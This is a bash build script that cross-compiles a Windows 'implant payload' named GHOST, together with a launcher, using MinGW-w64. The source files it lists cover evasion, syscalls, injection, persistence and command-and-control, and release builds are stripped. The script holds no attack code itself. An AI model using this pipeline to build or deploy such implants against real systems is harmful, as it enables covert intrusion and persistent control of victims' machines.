#!/bin/bash
# GHOST build script for Linux (Cross-Compilation via MinGW-w64)
# Requires: sudo apt install mingw-w64
#
# Usage:
#   ./build.sh            — builds ghost.exe + launcher.exe (release)
#   ./build.sh --debug    — builds with debug symbols, no stripping

set -e

OUT_DIR="build"
DEBUG=0

for arg in "$@"; do
    case "$arg" in
        --debug) DEBUG=1 ;;
    esac
done

mkdir -p "$OUT_DIR"

# ---------------------------------------------------------------------------
# Shared flags
# ---------------------------------------------------------------------------

CXX="x86_64-w64-mingw32-g++"
WINDRES="x86_64-w64-mingw32-windres"

COMMON_FLAGS="-std=c++17 -DUNICODE -D_UNICODE -mwindows -static -static-libgcc -static-libstdc++ -I include"

if [ "$DEBUG" -eq 1 ]; then
    OPT_FLAGS="-O0 -g -DDEBUG"
    STRIP_FLAG=""
    echo "[*] Building DEBUG configuration..."
else
    OPT_FLAGS="-O2"
    STRIP_FLAG="-s"
    echo "[*] Building RELEASE configuration..."
fi

# ---------------------------------------------------------------------------
# ghost.exe — implant payload
# ---------------------------------------------------------------------------

echo "[*] Compiling resources..."
$WINDRES resources/ghost.rc -O coff -o "$OUT_DIR/ghost.res"

echo "[*] Compiling ghost.exe..."
$CXX $COMMON_FLAGS $OPT_FLAGS $STRIP_FLAG \
    src/main.cpp \
    src/syscalls.cpp \
    src/evasion.cpp \
    src/injection.cpp \
    src/persistence.cpp \
    src/c2.cpp \
    src/utils.cpp \
    "$OUT_DIR/ghost.res" \
    -lwinhttp -lwbemuuid -lole32 -loleaut32 -lntdll -ladvapi32 -lshell32 -luser32 \
    -o "$OUT_DIR/ghost.exe"

echo "[+] ghost.exe: $(ls -lh "$OUT_DIR/ghost.exe" | awk '{print $5}')"

# ---------------------------------------------------------------------------
# launcher.exe — tray launcher that spawns ghost.exe on demand
# ---------------------------------------------------------------------------

echo "[*] Compiling launcher.exe..."
$CXX $COMMON_FLAGS $OPT_FLAGS $STRIP_FLAG \
    src/launcher.cpp \
    -luser32 -lshell32 -lwinhttp \
    -o "$OUT_DIR/launcher.exe"

echo "[+] launcher.exe: $(ls -lh "$OUT_DIR/launcher.exe" | awk '{print $5}')"

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------

echo ""
echo "[+] Build complete — output in $OUT_DIR/"
ls -lh "$OUT_DIR/"*.exe
